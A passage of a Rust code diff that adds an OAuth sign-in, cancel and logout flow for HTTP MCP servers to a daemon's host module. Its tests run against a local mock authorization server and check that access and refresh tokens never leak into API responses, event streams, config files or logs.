@@ -14,9 +14,10 @@ use std::time::Duration;
 
 use async_trait::async_trait;
 use daemon_api::mcp::{
-    McpCatalogEntryDto, McpCatalogInstallDto, McpErrorKind as ErrorKindDto, McpFolderDto,
-    McpRequiredSecretDto, McpServerChanged, McpServerDto, McpServerInput, McpStatus, McpToolDto,
-    McpTransportInput, McpTransportKind, McpTransportObject,
+    McpAuthStart, McpAuthState, McpCatalogEntryDto, McpCatalogInstallDto,
+    McpErrorKind as ErrorKindDto, McpFolderDto, McpOAuthConfig, McpRequiredSecretDto,
+    McpServerChanged, McpServerDto, McpServerInput, McpStatus, McpToolDto, McpTransportInput,
+    McpTransportKind, McpTransportObject,
 };
 use daemon_api::{McpControl, McpControlError};
 use mcp_bridge::{
@@ -33,6 +34,27 @@ use crate::doctor::MCP_FILE;
 /// How often the status poller looks for changes the API did not cause
 /// (a quarantine after failing calls, a crashed child ...).
 const POLL_EVERY: Duration = Duration::from_secs(2);
+/// How a sign-in flow ended: `None` while it runs, then `Ok` or a message.
+type FlowOutcome = Option<Result<(), String>>;
+
+/// One user-started sign-in.  It stays in `McpHost::auth_flows` until its
+/// task has finished, through the token exchange and the reconnect, so every
+/// cancel, logout, update, removal or new start can abort and join it.
+struct SignInFlow {
+    task: tokio::task::JoinHandle<Result<(), McpError>>,
+    /// Where a pasted redirect goes (headless hosts); taken by the first paste.
+    paste: Option<tokio::sync::oneshot::Sender<String>>,
+    /// Set by the task when it ends; a waiting paste request watches it.
+    done: tokio::sync::watch::Receiver<FlowOutcome>,
+}
+
+impl SignInFlow {
+    /// Still exchanging or reconnecting (an outcome is final even if the
+    /// task has not quite returned yet).
+    fn running(&self) -> bool {
+        !self.task.is_finished() && self.done.borrow().is_none()
+    }
+}
 
 const FILE_HEADER: &str = "\
 # MCP servers of this bot (managed by the app; you may edit it while the daemon is stopped).\n\
@@ -50,6 +72,9 @@ const FILE_HEADER: &str = "\
 
 /// The running MCP servers of a daemon.
 pub struct McpHost {
+    /// Held across start/cancel/logout and replacement, so an old callback
+    /// cannot persist credentials after cancellation or removal returns.
+    auth_flows: tokio::sync::Mutex<HashMap<String, SignInFlow>>,
     manager: McpManager,
     registry: ToolRegistry,
     store: TomlFileStore,
@@ -70,6 +95,8 @@ pub struct McpHost {
     broken: Option<String>,
     events: broadcast::Sender<McpServerChanged>,
     poller: Mutex<Option<tokio::task::JoinHandle<()>>>,
+    /// The daemon's production redactor (audit rows of MCP routes).
+    redactor: Option<mcp_bridge::ExternalRedactor>,
 }
 
 impl McpHost {
@@ -82,8 +109,16 @@ impl McpHost {
         registry: ToolRegistry,
         secrets: Option<Arc<dyn SecretStore>>,
         redactor: Option<mcp_bridge::ExternalRedactor>,
+        registrar: Option<mcp_bridge::oauth::SecretRegistrar>,
     ) -> Arc<Self> {
-        Self::start_with_policy(data_dir, registry, secrets, redactor, McpPolicy::default())
+        Self::start_with_policy(
+            data_dir,
+            registry,
+            secrets,
+            redactor,
+            registrar,
+            McpPolicy::default(),
+        )
     }
 
     /// [`Self::start`] with a custom bridge policy (tests use short timeouts).
@@ -92,6 +127,7 @@ impl McpHost {
         registry: ToolRegistry,
         secrets: Option<Arc<dyn SecretStore>>,
         redactor: Option<mcp_bridge::ExternalRedactor>,
+        registrar: Option<mcp_bridge::oauth::SecretRegistrar>,
         policy: McpPolicy,
     ) -> Arc<Self> {
         let path = data_dir.join(MCP_FILE);
@@ -132,8 +168,11 @@ impl McpHost {
         }
         // The daemon's live redactor masks every MCP diagnostic (stderr,
         // rmcp warnings, connect and discovery errors).
-        if let Some(r) = redactor {
+        if let Some(r) = redactor.clone() {
             manager = manager.with_redactor(r);
+        }
+        if let Some(register) = registrar {
+            manager = manager.with_secret_registrar(register);
         }
         let catalog = mcp_bridge::builtin_catalog().unwrap_or_else(|e| {
             eprintln!("warning: {e}");
@@ -152,6 +191,7 @@ impl McpHost {
             })
             .collect();
         let host = Arc::new(Self {
+            auth_flows: tokio::sync::Mutex::new(HashMap::new()),
             manager,
             registry,
             store,
@@ -166,6 +206,7 @@ impl McpHost {
             broken,
             events: broadcast::channel(64).0,
             poller: Mutex::new(None),
+            redactor,
         });
         for c in &loaded {
             host.announced
@@ -187,6 +228,12 @@ impl McpHost {
 
     /// Disconnect every server (stdio children exit) and stop the poller.
     pub async fn shutdown(&self) {
+        let mut flows = self.auth_flows.lock().await;
+        for (_, flow) in flows.drain() {
+            flow.task.abort();
+            let _ = flow.task.await;
+        }
+        drop(flows);
         if let Some(p) = self.poller.lock().take() {
             p.abort();
         }
@@ -203,6 +250,7 @@ impl McpHost {
             return McpStatus::Connecting;
         }
         match self.snapshot(name) {
+            Some(s) if s.auth_required => McpStatus::AuthRequired,
             Some(s) => match s.status {
                 ServerStatus::Connected => McpStatus::Connected,
                 ServerStatus::Quarantined => McpStatus::Quarantined,
@@ -258,6 +306,13 @@ impl McpHost {
             ),
         };
         McpServerDto {
+            oauth: cfg.oauth.as_ref().map(|c| McpOAuthConfig {
+                client_id: c.client_id.clone(),
+                client_secret_ref: c.client_secret_ref.clone(),
+                client_metadata_url: c.client_metadata_url.clone(),
+                allow_loopback_http: c.allow_loopback_http,
+                issuer: c.issuer.clone(),
+            }),
             name: cfg.id.clone(),
             transport,
             command,
@@ -297,6 +352,13 @@ impl McpHost {
             .get(name)
             .cloned()
             .ok_or_else(|| McpControlError::NotFound(format!("mcp server {name}")))
+    }
+
+    fn check_http(&self, name: &str) -> Result<(), McpControlError> {
+        if !matches!(self.config_of(name)?.transport, McpTransport::Http { .. }) {
+            return Err(invalid("OAuth applies only to HTTP servers"));
+        }
+        Ok(())
     }
 
     fn check_writable(&self) -> Result<(), McpControlError> {
@@ -504,6 +566,16 @@ fn map_err(e: McpError) -> McpControlError {
     }
 }
 
+/// Abort `name`'s flow and wait until its task is gone: afterwards it can
+/// neither exchange a code nor reconnect (and the manager's credential guard
+/// refuses any save it might still have attempted).
+async fn abort_sign_in(flows: &mut HashMap<String, SignInFlow>, name: &str) {
+    if let Some(flow) = flows.remove(name) {
+        flow.task.abort();
+        let _ = flow.task.await;
+    }
+}
+
 fn invalid(m: impl Into<String>) -> McpControlError {
     McpControlError::Invalid(m.into())
 }
@@ -654,6 +726,11 @@ fn merge_update(
         }
     }
     let mut cfg = prev.clone();
+    if let Some(value) = obj.get("oauth") {
+        cfg.oauth = serde_json::from_value(value.clone()).map_err(|_| {
+            invalid("invalid OAuth settings; use client_secret_ref, never a secret value")
+        })?;
+    }
     if let Some(transport) = obj.get("transport") {
         match transport {
             serde_json::Value::String(kind) => set_transport_kind(&mut cfg, kind)?,
@@ -773,6 +850,13 @@ fn to_config(name: &str, input: McpServerInput) -> Result<McpServerConfig, McpCo
         ),
     };
     let cfg = McpServerConfig {
+        oauth: input.oauth.map(|c| mcp_bridge::OAuthConfig {
+            client_id: c.client_id,
+            client_secret_ref: c.client_secret_ref,
+            client_metadata_url: c.client_metadata_url,
+            allow_loopback_http: c.allow_loopback_http,
+            issuer: c.issuer,
+        }),
         id: name.to_owned(),
         transport,
         enabled: input.enabled.unwrap_or(true),
@@ -829,6 +913,135 @@ fn catalog_dto(e: &CatalogEntry, suggestion: Option<&str>) -> Option<McpCatalogE
 
 #[async_trait]
 impl McpControl for McpHost {
+    fn redact(&self, text: &str) -> String {
+        self.redactor
+            .as_ref()
+            .map_or_else(|| text.to_owned(), |r| r(text))
+    }
+
+    async fn auth_start(&self, name: &str) -> Result<McpAuthStart, McpControlError> {
+        let mut flows = self.auth_flows.lock().await;
+        self.check_http(name)?;
+        if flows.get(name).is_some_and(SignInFlow::running) {
+            return Err(McpControlError::Conflict(
+                "a sign-in is already in progress".into(),
+            ));
+        }
+        abort_sign_in(&mut flows, name).await;
+        let handle = self.manager.server_handle(name).map_err(map_err)?;
+        let sign_in = self
+            .manager
+            .start_sign_in(name, mcp_bridge::oauth::SignInOptions::default())
+            .await
+            .map_err(map_err)?;
+        let response = McpAuthStart {
+            authorization_url: sign_in.authorization_url().to_owned(),
+            expires_in: mcp_bridge::oauth::CALLBACK_TIMEOUT.as_secs(),
+        };
+        let (paste, pasted) = tokio::sync::oneshot::channel();
+        let (outcome, done) = tokio::sync::watch::channel(None);
+        let task = tokio::spawn(async move {
+            let result = async {
+                sign_in
+                    .finish_or_pasted(mcp_bridge::oauth::CALLBACK_TIMEOUT, Some(pasted))
+                    .await?;
+                handle.reenable().await.map(|_| ())
+            }
+            .await;
+            outcome.send_replace(Some(result.as_ref().copied().map_err(ToString::to_string)));
+            result
+        });
+        flows.insert(
+            name.to_owned(),
+            SignInFlow {
+                task,
+                paste: Some(paste),
+                done,
+            },
+        );
+        Ok(response)
+    }
+
+    async fn auth_callback(
+        &self,
+        name: &str,
+        redirect_url: &str,
+    ) -> Result<McpAuthState, McpControlError> {
+        let mut done = {
+            let mut flows = self.auth_flows.lock().await;
+            self.check_http(name)?;
+            let waiting = flows
+                .get_mut(name)
+                .filter(|flow| flow.running())
+                .and_then(|flow| flow.paste.take().map(|paste| (paste, flow.done.clone())));
+            let Some((paste, done)) = waiting else {
+                return Err(invalid("no sign-in is waiting for a redirect"));
+            };
+            if paste.send(redirect_url.to_owned()).is_err() {
+                return Err(invalid("no sign-in is waiting for a redirect"));
+            }
+            done
+        };
+        // The flow stays tracked while this request waits: cancel, logout,
+        // update and removal abort and join it as usual, and dropping this
+        // request (or its timeout) leaves it to them.
+        let finished = tokio::time::timeout(mcp_bridge::oauth::CALLBACK_TIMEOUT, async {
+            done.wait_for(Option::is_some).await.map(|o| o.clone())
+        })
+        .await;
+        let outcome = match finished {
+            Ok(Ok(outcome)) => outcome,
+            // The flow was aborted (cancel, logout, removal) before it ended.
+            Ok(Err(_)) => return Err(invalid("the sign-in was cancelled")),
+            Err(_) => return Err(invalid("sign-in did not finish")),
+        };
+        self.announce(name);
+        if let Some(Err(message)) = outcome {
+            return Err(invalid(format!("sign-in failed: {message}")));
+        }
+        self.auth_status(name).await
+    }
+
+    async fn auth_cancel(&self, name: &str) -> Result<McpAuthState, McpControlError> {
+        self.check_http(name)?;
+        {
+            let mut flows = self.auth_flows.lock().await;
+            abort_sign_in(&mut flows, name).await;
+        }
+        self.auth_status(name).await
+    }
+
+    async fn auth_status(&self, name: &str) -> Result<McpAuthState, McpControlError> {
+        self.check_http(name)?;
+        let flows = self.auth_flows.lock().await;
+        if flows.get(name).is_some_and(SignInFlow::running) {
+            return Ok(McpAuthState::SigningIn);
+        }
+        if self.snapshot(name).is_some_and(|s| s.auth_required) {
+            return Ok(McpAuthState::AuthRequired);
+        }
+        Ok(
+            if self
+                .manager
+                .has_stored_authorization(name)
+                .await
+                .map_err(map_err)?
+            {
+                McpAuthState::SignedIn
+            } else {
+                McpAuthState::SignedOut
+            },
+        )
+    }
+
+    async fn auth_logout(&self, name: &str) -> Result<McpAuthState, McpControlError> {
+        let mut flows = self.auth_flows.lock().await;
+        self.check_http(name)?;
+        abort_sign_in(&mut flows, name).await;
+        self.manager.sign_out(name).await.map_err(map_err)?;
+        self.announce(name);
+        Ok(McpAuthState::SignedOut)
+    }
     fn list(&self) -> Vec<McpServerDto> {
         let all: Vec<McpServerConfig> = self.configs.lock().values().cloned().collect();
         all.iter().map(|c| self.dto(c)).collect()
@@ -867,6 +1080,8 @@ impl McpControl for McpHost {
         name: &str,
         input: serde_json::Value,
     ) -> Result<McpServerDto, McpControlError> {
+        let mut flows = self.auth_flows.lock().await;
+        abort_sign_in(&mut flows, name).await;
         let (cfg, old, handle, generation) = {
             let _op = self.ops.lock().await;
             self.check_writable()?;
@@ -963,6 +1178,8 @@ impl McpControl for McpHost {
     }
 
     async fn remove(&self, name: &str) -> Result<(), McpControlError> {
+        let mut flows = self.auth_flows.lock().await;
+        abort_sign_in(&mut flows, name).await;
         let old = {
             let _op = self.ops.lock().await;
             self.check_writable()?;
@@ -1046,6 +1263,9 @@ impl McpControl for McpHost {
 
 impl Drop for McpHost {
     fn drop(&mut self) {
+        for (_, flow) in self.auth_flows.get_mut().drain() {
+            flow.task.abort();
+        }
         if let Some(p) = self.poller.lock().take() {
             p.abort();
         }
@@ -1072,7 +1292,780 @@ mod tests {
     }
 
     fn open(dir: &Path) -> Arc<McpHost> {
-        McpHost::start_with_policy(dir, ToolRegistry::new(), None, None, fast_policy())
+        McpHost::start_with_policy(dir, ToolRegistry::new(), None, None, None, fast_policy())
+    }
+
+    #[tokio::test]
+    async fn oauth_token_values_are_registered_with_the_live_daemon_redactor() {
+        const ACCESS: &str = "host-access-sentinel-834c";
+        const REFRESH: &str = "host-refresh-sentinel-0fd9";
+        let dir = tempfile::tempdir().unwrap();
+        let url = "http://127.0.0.1:1/mcp";
+        let config = McpServerConfig::http("redaction", url);
+        TomlFileStore::new(dir.path().join(MCP_FILE))
+            .save(&[config])
+            .unwrap();
+        let store = Arc::new(secret_store::MemoryStore::new());
+        store
+            .set(
+                "mcp/redaction/oauth",
+                &json!({
+                    "resource": url,
+                    "credentials": {"client_id": "fixture", "token_response": {
+                        "access_token": ACCESS, "refresh_token": REFRESH, "token_type": "Bearer"
+                    }, "granted_scopes": [], "token_received_at": null, "issuer": null}
+                })
+                .to_string(),
+            )
+            .unwrap();
+        let redactor = agent_core::SharedRedactor::default();
+        let external: mcp_bridge::ExternalRedactor = {
+            let handle = redactor.clone();
+            Arc::new(move |text| handle.redact(text))
+        };
+        let registrar: mcp_bridge::oauth::SecretRegistrar = {
+            let handle = redactor.clone();
+            Arc::new(move |value| handle.register(value))
+        };
+        let host = McpHost::start_with_policy(
+            dir.path(),
+            ToolRegistry::new(),
+            Some(store),
+            Some(external),
+            Some(registrar),
+            fast_policy(),
+        );
+        tokio::time::timeout(Duration::from_secs(2), async {
+            while redactor.redact(ACCESS).contains(ACCESS) {
+                tokio::time::sleep(Duration::from_millis(5)).await;
+            }
+        })
+        .await
+        .unwrap();
+        let rendered = redactor.redact(&format!("access={ACCESS} refresh={REFRESH}"));
+        assert!(!rendered.contains(ACCESS));
+        assert!(!rendered.contains(REFRESH));
+        // Registration survives the production redactor's periodic reload.
+        redactor.replace(secret_store::Redactor::default());
+        assert!(!redactor.redact(ACCESS).contains(ACCESS));
+        assert!(!redactor.redact(REFRESH).contains(REFRESH));
+        host.shutdown().await;
+    }
+
+    /// Fake protected MCP server and authorization server on one loopback
+    /// port: `/mcp` answers 401 unless the bearer is `access`, then speaks MCP.
+    struct FakeRemote {
+        access: &'static str,
+    }
+
+    impl wiremock::Respond for FakeRemote {
+        fn respond(&self, request: &wiremock::Request) -> wiremock::ResponseTemplate {
+            let authorized = request
+                .headers
+                .get("authorization")
+                .and_then(|v| v.to_str().ok())
+                == Some(format!("Bearer {}", self.access).as_str());
+            if !authorized {
+                return wiremock::ResponseTemplate::new(401)
+                    .insert_header("www-authenticate", "Bearer");
+            }
+            let body: serde_json::Value = serde_json::from_slice(&request.body).unwrap_or_default();
+            let method = body["method"].as_str().unwrap_or_default();
+            if body.get("id").is_none() {
+                let status = if method.starts_with("notifications/") {
+                    202
+                } else {
+                    405
+                };
+                return wiremock::ResponseTemplate::new(status);
+            }
+            let result = match method {
+                "initialize" => json!({
+                    "protocolVersion": "2025-11-25", "capabilities": {"tools": {}},
+                    "serverInfo": {"name": "oauth-host-fixture", "version": "1"},
+                }),
+                "server/discover" => json!({
+                    "resultType": "complete", "supportedVersions": ["2026-07-28"],
+                    "capabilities": {"tools": {}}, "ttlMs": 0, "cacheScope": "private",
+                    "_meta": {"io.modelcontextprotocol/serverInfo": {"name": "oauth-host-fixture", "version": "1"}},
+                }),
+                "tools/list" => json!({
+                    "resultType": "complete", "ttlMs": 0, "cacheScope": "private",
+                    "tools": [{"name": "echo", "description": "Echo", "inputSchema": {"type": "object"}}],
+                }),
+                _ => json!({"resultType": "complete"}),
+            };
+            wiremock::ResponseTemplate::new(200)
+                .set_body_json(json!({"jsonrpc": "2.0", "id": body["id"], "result": result}))
+        }
+    }
+
+    async fn fake_remote(access: &'static str, refresh: &'static str) -> wiremock::MockServer {
+        fake_remote_with_token_delay(access, refresh, Duration::ZERO).await
+    }
+
+    /// [`fake_remote`] whose token endpoint answers only after `delay`.
+    async fn fake_remote_with_token_delay(
+        access: &'static str,
+        refresh: &'static str,
+        delay: Duration,
+    ) -> wiremock::MockServer {
+        use wiremock::matchers::{method, path, path_regex};
+        use wiremock::{Mock, ResponseTemplate};
+        let server = wiremock::MockServer::start().await;
+        let base = server.uri();
+        Mock::given(path("/mcp"))
+            .respond_with(FakeRemote { access })
+            .mount(&server)
+            .await;
+        Mock::given(path_regex("oauth-protected-resource"))
+            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
+                "resource": format!("{base}/mcp"),
+                "authorization_servers": [base],
+            })))
+            .mount(&server)
+            .await;
+        Mock::given(path_regex(
+            "oauth-authorization-server|openid-configuration",
+        ))
+        .respond_with(ResponseTemplate::new(200).set_body_json(json!({
+            "issuer": base,
+            "authorization_endpoint": format!("{base}/authorize"),
+            "token_endpoint": format!("{base}/token"),
+            "response_types_supported": ["code"],
+            "grant_types_supported": ["authorization_code", "refresh_token"],
+            "code_challenge_methods_supported": ["S256"],
+            "authorization_response_iss_parameter_supported": true,
+            "token_endpoint_auth_methods_supported": ["none"],
+        })))
+        .mount(&server)
+        .await;
+        Mock::given(method("POST"))
+            .and(path("/token"))
+            .respond_with(
+                ResponseTemplate::new(200)
+                    .set_body_json(json!({
+                        "access_token": access, "token_type": "Bearer",
+                        "expires_in": 3600, "refresh_token": refresh,
+                    }))
+                    .set_delay(delay),
+            )
+            .mount(&server)
+            .await;
+        server
+    }
+
+    fn query_pairs(url: &str) -> HashMap<String, String> {
+        reqwest::Url::parse(url)
+            .unwrap()
+            .query_pairs()
+            .map(|(k, v)| (k.into_owned(), v.into_owned()))
+            .collect()
+    }
+
+    /// Play the browser: hit the loopback `redirect_uri` with `query`.
+    async fn browser_redirect(authorization_url: &str, query: &str) -> std::io::Result<String> {
+        use tokio::io::{AsyncReadExt, AsyncWriteExt};
+        let redirect =
+            reqwest::Url::parse(&query_pairs(authorization_url)["redirect_uri"]).unwrap();
+        let address = format!(
+            "{}:{}",
+            redirect.host_str().unwrap(),
+            redirect.port().unwrap()
+        );
+        let mut socket = tokio::net::TcpStream::connect(&address).await?;
+        socket
+            .write_all(
+                format!(
+                    "GET {}?{query} HTTP/1.1\r\nHost: {address}\r\n\r\n",
+                    redirect.path()
+                )
+                .as_bytes(),
+            )
+            .await?;
+        let mut out = String::new();
+        socket.read_to_string(&mut out).await?;
+        Ok(out)
+    }
+
+    async fn wait_auth(host: &McpHost, name: &str, want: McpAuthState) {
+        let reached = tokio::time::timeout(Duration::from_secs(10), async {
+            while host.auth_status(name).await.unwrap() != want {
+                tokio::time::sleep(Duration::from_millis(10)).await;
+            }
+        })
+        .await;
+        assert!(reached.is_ok(), "{name}: auth state never became {want:?}");
+    }
+
+    async fn wait_for(host: &McpHost, name: &str, want: McpStatus) {
+        let reached = tokio::time::timeout(Duration::from_secs(10), async {
+            while host.status_of(name) != want {
+                tokio::time::sleep(Duration::from_millis(10)).await;
+            }
+        })
+        .await;
+        assert!(
+            reached.is_ok(),
+            "{name}: wanted {want:?}, is {:?}",
+            host.status_of(name)
+        );
+    }
+
+    #[tokio::test(flavor = "multi_thread")]
+    #[allow(clippy::too_many_lines)] // One user journey: 401, cancel, sign-in, logout.
+    async fn user_sign_in_through_the_host_connects_and_logout_forgets() {
+        const ACCESS: &str = "host-flow-access-sentinel-5d21";
+        const REFRESH: &str = "host-flow-refresh-sentinel-a07e";
+        let remote = fake_remote(ACCESS, REFRESH).await;
+        let base = remote.uri();
+        let dir = tempfile::tempdir().unwrap();
+        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
+        config.oauth = Some(mcp_bridge::OAuthConfig {
+            client_id: Some("praxi-host-test".into()),
+            allow_loopback_http: true,
+            issuer: Some(base.clone()),
+            ..mcp_bridge::OAuthConfig::default()
+        });
+        TomlFileStore::new(dir.path().join(MCP_FILE))
+            .save(&[config])
+            .unwrap();
+        let store = Arc::new(secret_store::MemoryStore::new());
+        let redactor = agent_core::SharedRedactor::default();
+        let registrar: mcp_bridge::oauth::SecretRegistrar = {
+            let handle = redactor.clone();
+            Arc::new(move |value| handle.register(value))
+        };
+        let registry = ToolRegistry::new();
+        let host = McpHost::start_with_policy(
+            dir.path(),
+            registry.clone(),
+            Some(store.clone()),
+            None,
+            Some(registrar),
+            fast_policy(),
+        );
+        let mut events = host.subscribe();
+
+        // A 401 waits for the user; it is neither an error nor a quarantine.
+        wait_for(&host, "remote", McpStatus::AuthRequired).await;
+        assert_eq!(
+            host.auth_status("remote").await.unwrap(),
+            McpAuthState::AuthRequired
+        );
+        assert_eq!(
+            host.manager
+                .snapshot("remote")
+                .unwrap()
+                .consecutive_failures,
+            0
+        );
+        assert!(registry.get("mcp:remote/echo").is_none());
+
+        // Sign-in, then cancel: the one-shot listener is gone afterwards.
+        let started = host.auth_start("remote").await.unwrap();
+        assert_eq!(started.expires_in, 300);
+        assert_eq!(
+            host.auth_status("remote").await.unwrap(),
+            McpAuthState::SigningIn
+        );
+        assert!(matches!(
+            host.auth_start("remote").await,
+            Err(McpControlError::Conflict(_))
+        ));
+        let cancelled = host.auth_cancel("remote").await.unwrap();
+        assert_ne!(cancelled, McpAuthState::SigningIn);
+        let params = query_pairs(&started.authorization_url);
+        let late = browser_redirect(
+            &started.authorization_url,
+            &format!("code=c&state={}&iss={base}", params["state"]),
+        )
+        .await;
+        assert!(
+            late.as_ref().map_or(true, |r| !r.contains(" 200 ")),
+            "callback still open: {late:?}"
+        );
+        assert!(store.get("mcp/remote/oauth").unwrap().is_none());
+
+        // Full sign-in: the tool list arrives with the bearer.
+        let started = host.auth_start("remote").await.unwrap();
+        let params = query_pairs(&started.authorization_url);
+        assert_eq!(params["code_challenge_method"], "S256");
+        assert_eq!(params["resource"], format!("{base}/mcp"));
+        browser_redirect(
+            &started.authorization_url,
+            &format!("code=code-1&state={}&iss={base}", params["state"]),
+        )
+        .await
+        .unwrap();
+        wait_for(&host, "remote", McpStatus::Connected).await;
+        // The flow ends after its reconnect (tool discovery included).
+        wait_auth(&host, "remote", McpAuthState::SignedIn).await;
+        assert!(registry.get("mcp:remote/echo").is_some());
+        let stored = store.get("mcp/remote/oauth").unwrap().unwrap();
+        assert!(stored.expose().contains(ACCESS));
+        // Neither the DTO, the config file nor the event stream carries a token.
+        let dto = serde_json::to_string(&host.list()).unwrap();
+        let file = std::fs::read_to_string(dir.path().join(MCP_FILE)).unwrap();
+        // The status poller announces the move to `connected` (POLL_EVERY).
+        let mut seen = String::new();
+        while !seen.contains("\"connected\"") {
+            let Ok(Ok(event)) = tokio::time::timeout(POLL_EVERY * 3, events.recv()).await else {
+                break;
+            };
+            seen.push_str(&serde_json::to_string(&event).unwrap());
+        }
+        assert!(
+            seen.contains("auth_required") && seen.contains("connected"),
+            "{seen}"
+        );
+        for text in [&dto, &file, &seen] {
+            assert!(!text.contains(ACCESS) && !text.contains(REFRESH));
+        }
+        assert!(!redactor.redact(ACCESS).contains(ACCESS));
+        assert!(!redactor.redact(REFRESH).contains(REFRESH));
+
+        // Logout forgets the credential and the tools.
+        assert_eq!(
+            host.auth_logout("remote").await.unwrap(),
+            McpAuthState::SignedOut
+        );
+        assert!(store.get("mcp/remote/oauth").unwrap().is_none());
+        assert!(registry.get("mcp:remote/echo").is_none());
+        assert_ne!(
+            host.auth_status("remote").await.unwrap(),
+            McpAuthState::SignedIn
+        );
+
+        // OAuth routes refuse stdio servers.
+        host.add(stdio("local", false)).await.unwrap();
+        assert!(matches!(
+            host.auth_start("local").await,
+            Err(McpControlError::Invalid(_))
+        ));
+        host.shutdown().await;
+    }
+
+    /// Every file under `dir`, recursively (event logs, the SQLite database
+    /// holding the audit log and its WAL, `mcp.toml` ...).
+    fn files_under(dir: &Path) -> Vec<std::path::PathBuf> {
+        let mut out = Vec::new();
+        let mut stack = vec![dir.to_path_buf()];
+        while let Some(d) = stack.pop() {
+            for entry in std::fs::read_dir(&d).unwrap().flatten() {
+                let path = entry.path();
+                if path.is_dir() {
+                    stack.push(path);
+                } else {
+                    out.push(path);
+                }
+            }
+        }
+        out
+    }
+
+    fn contains(haystack: &[u8], needle: &str) -> bool {
+        haystack
+            .windows(needle.len())
+            .any(|w| w == needle.as_bytes())
+    }
+
+    /// Sign-in driven through the real daemon routes: the tokens reach the
+    /// secret store only, never an API response, the global event stream,
+    /// the audit log, a run event log or any other file of the data dir.
+    #[tokio::test(flavor = "multi_thread")]
+    #[allow(clippy::too_many_lines)] // One linear daemon journey.
+    async fn daemon_sign_in_leaves_no_token_in_events_audit_or_logs() {
+        const TOKEN: &str = "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd";
+        const ACCESS: &str = "daemon-flow-access-sentinel-c31e";
+        const REFRESH: &str = "daemon-flow-refresh-sentinel-77b0";
+        let remote = fake_remote(ACCESS, REFRESH).await;
+        let base = remote.uri();
+        let dir = tempfile::tempdir().unwrap();
+        let mut config = McpServerConfig::http("remote", format!("{base}/mcp"));
+        config.oauth = Some(mcp_bridge::OAuthConfig {
+            client_id: Some("praxi-daemon-test".into()),
+            allow_loopback_http: true,
+            issuer: Some(base.clone()),
+            ..mcp_bridge::OAuthConfig::default()
+        });
+        TomlFileStore::new(dir.path().join(MCP_FILE))
+            .save(&[config])
+            .unwrap();
+
+        let storage = Arc::new(storage::Storage::open(dir.path()).unwrap());
+        let redactor = agent_core::SharedRedactor::default();
+        let agent = crate::serve::build_agent_with_redactor(
+            &storage,
+            agent_core::Providers::single(Arc::new(daemon_api::fake::FakeProvider)),
+            dir.path(),
+            None,
+            redactor.clone(),
+        );
+        let secrets: Arc<dyn SecretStore> = Arc::new(secret_store::MemoryStore::new());
+        let external: mcp_bridge::ExternalRedactor = {
+            let handle = redactor.clone();
+            Arc::new(move |text| handle.redact(text))
+        };
+        let registrar: mcp_bridge::oauth::SecretRegistrar = {
+            let handle = redactor.clone();
+            Arc::new(move |value| handle.register(value))
+        };
+        let host = McpHost::start_with_policy(
+            dir.path(),
+            agent.tool_registry(),
+            Some(Arc::clone(&secrets)),
+            Some(external),
+            Some(registrar),
+            fast_policy(),
+        );
+        wait_for(&host, "remote", McpStatus::AuthRequired).await;
+        let state = daemon_api::AppState::new(
+            agent,
+            Arc::clone(&storage),
+            daemon_api::DaemonConfig::new(TOKEN),
+        )
+        .unwrap();
+        state.set_mcp(Arc::clone(&host) as Arc<dyn McpControl>);
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let url = format!("http://{}", listener.local_addr().unwrap());
+        tokio::spawn(daemon_api::serve(listener, state, std::future::pending()));
+        let http = reqwest::Client::new();
+        let bearer = format!("Bearer {TOKEN}");
+
+        // Record the global event stream for the whole journey.
+        let stream = Arc::new(parking_lot::Mutex::new(Vec::<u8>::new()));
+        let mut events = http
+            .get(format!("{url}/v1/events"))
+            .header("authorization", &bearer)
+            .send()
+            .await
+            .unwrap();
+        assert!(events.status().is_success(), "{}", events.status());
+        let recorder = tokio::spawn({
+            let stream = Arc::clone(&stream);
+            async move {
+                while let Ok(Some(chunk)) = events.chunk().await {
+                    stream.lock().extend_from_slice(&chunk);
+                }
+            }
+        });
+
+        let mut responses = String::new();
+        let started: serde_json::Value = {
+            let r = http
+                .post(format!("{url}/v1/mcp/servers/remote/auth/start"))
+                .header("authorization", &bearer)
+                .send()
+                .await
+                .unwrap();
+            assert!(r.status().is_success(), "{}", r.status());
+            let text = r.text().await.unwrap();
+            responses.push_str(&text);
+            serde_json::from_str(&text).unwrap()
+        };
+        let authorization_url = started["authorization_url"].as_str().unwrap();
+        let params = query_pairs(authorization_url);
+        browser_redirect(
+            authorization_url,
+            &format!("code=code-1&state={}&iss={base}", params["state"]),
+        )
+        .await
+        .unwrap();
+        wait_for(&host, "remote", McpStatus::Connected).await;
+        // The flow ends after its reconnect (tool discovery included).
+        wait_auth(&host, "remote", McpAuthState::SignedIn).await;
+        for path in ["/v1/mcp/servers", "/v1/mcp/servers/remote/auth/status"] {
+            let text = http
+                .get(format!("{url}{path}"))
+                .header("authorization", &bearer)
+                .send()
+                .await
+                .unwrap()
+                .text()
+                .await
+                .unwrap();
+            responses.push_str(&text);
+        }
+        assert!(responses.contains("\"signed_in\""), "{responses}");
+        assert!(
+            secrets
+                .get("mcp/remote/oauth")
+                .unwrap()
+                .unwrap()
+                .expose()
+                .contains(ACCESS)
+        );
+        // Wait until the stream carried the move to `connected`.
+        tokio::time::timeout(POLL_EVERY * 3, async {
+            while !contains(&stream.lock(), "\"connected\"") {
+                tokio::time::sleep(Duration::from_millis(20)).await;
+            }
+        })
+        .await
+        .expect("connected event on the global stream");
+        let r = http
+            .post(format!("{url}/v1/mcp/servers/remote/auth/logout"))
+            .header("authorization", &bearer)
+            .send()
+            .await
+            .unwrap();
+        responses.push_str(&r.text().await.unwrap());
+        host.shutdown().await;
+        recorder.abort();
+
+        let stream = stream.lock().clone();
+        assert!(contains(&stream, "mcp_server_changed"));
+        // Positive control: the scan does read the files (public client id).
+        assert!(
+            files_under(dir.path())
+                .iter()
+                .any(|f| contains(&std::fs::read(f).unwrap_or_default(), "praxi-daemon-test"))
+        );
+        for token in [ACCESS, REFRESH] {
+            assert!(!responses.contains(token), "API response carries {token}");
+            assert!(!contains(&stream, token), "event stream carries {token}");
+            for file in files_under(dir.path()) {
+                let bytes = std::fs::read(&file).unwrap_or_default();
+                assert!(
+                    !contains(&bytes, token),
+                    "{} carries {token}",
+                    file.display()
+                );
+            }
+        }
+        // The audit log lives in the SQLite database scanned above.
+    }
+
+    /// Headless host: the browser runs elsewhere, so the user pastes the
